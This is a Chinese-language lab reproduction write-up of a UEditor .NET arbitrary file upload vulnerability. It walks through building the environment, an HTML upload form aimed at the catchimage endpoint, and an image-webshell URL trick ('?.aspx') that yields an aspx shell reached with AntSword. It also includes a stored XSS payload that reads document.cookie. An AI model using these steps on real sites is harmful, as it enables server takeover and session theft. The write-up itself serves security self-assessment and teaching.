****（一）测试者**** ** **前言****

在做HW前的资产自查时，发现某网站使用了uedior编辑器，且网站为net4.0，但是在实际渗透测试过程中，只挖掘到了存储型XSS，任意文件上传漏洞并没有利用成功。在测试任意文件上传时，远程的服务器没有接收到目标服务器的http请求，猜测目标服务器可能不出网。因为之前就听说过这个漏洞，一直没有测试过，所以想趁着这次复现一下利用过程。

 ** **（**** ** **二**** ** **）**** ** **过程复现****

 ** **1\. 使用windows2008服务器进行搭建**** ** **  
****

（1）若windows2008没有net4.0，则要提前下载安装

注意：首先安装IIS，再安装net4.0
，否则的话要在以下路径的目录下执行命令aspnet_regiis-i：C:\Windows\Microsoft.NET\Frameworkv4.0.30319\

（2）下载源码https://github.com/fex-team/ueditor

备注：这里直接选择utf8-net压缩包 就不用编译了。

 ** **2\. 解压与转换****

解压到网站目录下，将net目录转换为应用程序。

![1660114074_62f3549a7839f49b20464.png!small](https://image.3001.net/images/20220810/1660114074_62f3549a7839f49b20464.png!small)

 ** **3.应用程序转换**** ** **后访问网站**** ** **  
**** **
******首先判断是否存在任意文件的上传漏洞。其漏洞原理就是在抓取远程数据源的时候未对文件后缀名进行验证，导致了任意文件的写入漏洞。因此，我们可以在控制输入console.log(UE.version)的时候来判断编辑器的版本。

![1660114099_62f354b329ccecf7d50ba.png!small](https://image.3001.net/images/20220810/1660114099_62f354b329ccecf7d50ba.png!small)

 ** **4.**** ** **访问**** ** **网站**** ** **  
****访问以下网站，若出现下属情况则可以尝试漏洞利用：

<http://xxxxxxxxx/ueditor/net/controller.ashx?action=catchimage>

![1660114132_62f354d4223b14f3ab983.png!small](https://image.3001.net/images/20220810/1660114132_62f354d4223b14f3ab983.png!small)

 ** **5.**** ** **本地构造一个html页面用于文件上传使用****

<form
action="http://192.168.1.144/ueditor/net/controller.ashx?action=catchimage"
enctype="multipart/form-data" method="POST">

<p>shell addr: <input type="text" name="source[]" /></p>

<input type="submit" value="Submit" />

</form>

 ** **6\. 准备图片马****

在服务器准备一个图片马，在shell add中填写图片马的地址如http://xx.xx.xx.xx/haha.png?.aspx
，绕过上传使其解析为aspx。

![1660114170_62f354fa5568703c7af57.png!small](https://image.3001.net/images/20220810/1660114170_62f354fa5568703c7af57.png!small)

 ** **7\. 上传成功后，返回脚本木马地址****

点击submit,上传成功，直接返回aspx脚本木马的地址。

![1660114200_62f355185725b5e5f83bc.png!small](https://image.3001.net/images/20220810/1660114200_62f355185725b5e5f83bc.png!small)

此时我们的远程服务器也会有请求，可以以此来判断目标机器出网情况。

![1660114216_62f355281ba93fde3e03c.png!small](https://image.3001.net/images/20220810/1660114216_62f355281ba93fde3e03c.png!small)

使用蚁剑即可连接成功。

![1660114234_62f3553a8b1a973dfe82e.png!small](https://image.3001.net/images/20220810/1660114234_62f3553a8b1a973dfe82e.png!small)

此外还存在存储型XSS漏洞：

![1660114247_62f355478878c270fb6a7.png!small](https://image.3001.net/images/20220810/1660114247_62f355478878c270fb6a7.png!small)

抓包删除掉<p>标签后写入payload %3Cp%3E1111"><ImGsRc=1
OnErRoR=prompt(document.cookie)>%3Cbr%2F%3E%3C%2Fp%3E

![1660114265_62f3555934a8fb76654e9.png!small](https://image.3001.net/images/20220810/1660114265_62f3555934a8fb76654e9.png!small)

 ** **8\. 成功触发存储XSS****

![1660114280_62f355688f98e4f366fb8.png!small](https://image.3001.net/images/20220810/1660114280_62f355688f98e4f366fb8.png!small)

 ** **（三）测试者**** ** **总结****

在资产自查中发现了这个编辑器漏洞，但却没有利用成功，所以才想复测一下，利用的过程挺简单的，就是在环境搭建中遇到了很多问题，如刚开始先安装了net4.0再安装ISS，然后网站目录访问的权限问题，好在最后都被一一解决了。

